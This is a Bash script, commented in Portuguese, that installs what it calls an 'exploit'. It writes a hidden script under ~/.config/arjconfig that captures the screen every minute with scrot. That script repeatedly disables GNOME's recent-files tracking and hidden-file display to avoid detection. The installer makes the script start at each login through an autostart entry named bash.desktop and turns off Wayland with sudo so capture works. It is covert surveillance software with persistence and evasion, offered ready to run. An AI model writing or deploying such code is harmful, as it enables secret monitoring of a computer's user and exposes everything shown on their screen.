
export_exploit () {
	mkdir -p $DIRETORIO
	echo \
'
#!/usr/bin/env bash

# Variáveis de personalização
date=$(date +"%Y-%m-%d")
datetime=$(date +"%Y-%m-%d-%H-%M-%S")
screenshot_path="$HOME/.config/arjconfig/screenshot/$date"
screenshot_name="screenshot_$datetime.png"

apagar_pastas () {
	local="$HOME/.config/arjconfig/screenshot"  # Substitua pelo caminho para a pasta que você deseja monitorar
	limite=30
	# Verifica se o número de pastas atingiu o limite
	numero_de_pastas=$(find "$local" -mindepth 1 -maxdepth 1 -type d | wc -l)

	if [ "$numero_de_pastas" -ge "$limite" ]; then
			# Encontra a pasta mais antiga com base na data no nome
			pasta_mais_antiga=$(find "$local" -mindepth 1 -maxdepth 1 -type d | sort | head -n 1)

			if [ -n "$pasta_mais_antiga" ]; then
		rm -r "$pasta_mais_antiga"
			fi
	fi
}

# Função para criar o diretório de captura de tela, se não existir
create_screenshot_directory() {
		if [ ! -d "$screenshot_path" ]; then
				mkdir -p "$screenshot_path"
		fi
}

# Função para capturar a tela e salvar no diretório especificado
take_screenshot() {
    scrot -z "$screenshot_path/$screenshot_name"
}

desativa_recentes () {
	gsettings set org.gnome.desktop.privacy remember-recent-files false
	gsettings set org.gtk.Settings.FileChooser show-hidden false
}

# Função principal
main () {
		while true; do
		# Take a screenshot every minute
			create_screenshot_directory
			apagar_pastas
			desativa_recentes
			take_screenshot
			sleep 60
		done
}

main
' > $DIRETORIO/arjexec.sh
}

auto_start () {
	mkdir $HOME/.config/autostart
echo \
"
[Desktop Entry]
Type=Application
Exec=/bin/bash $DIRETORIO/arjexec.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[pt_BR]=arjexec
Name=arjexec
Comment[pt_BR]=
Comment=
" > $HOME/.config/autostart/bash.desktop
}

disable_wayland () {
		echo "WaylandEnable=false" | sudo tee -a /etc/gdm3/custom.conf
}

main_exec_exploit () {
		DIRETORIO=$HOME/.config/arjconfig
			sudo apt install scrot -y
			export_exploit
			auto_start
			disable_wayland
	echo -e "${VERDE}\nExploit instalado com sucesso!...${SEM_COR}\n"
}